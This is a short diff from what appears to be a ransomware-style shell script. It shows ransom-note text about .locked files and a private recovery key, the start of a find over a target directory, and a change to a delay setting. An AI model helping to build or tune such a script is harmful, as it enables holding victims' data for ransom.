@@ -42,7 +42,7 @@ Do not modify or delete files with the .locked extension.
 To restore access to your data, you need a private recovery key.
 EOF
 
-DELAY_SECONDS="${DELAY_SECONDS:-0.7}"
+DELAY_SECONDS="${DELAY_SECONDS:-0.8}"
 
 find "${TARGET_DIR}" \
   -xdev \
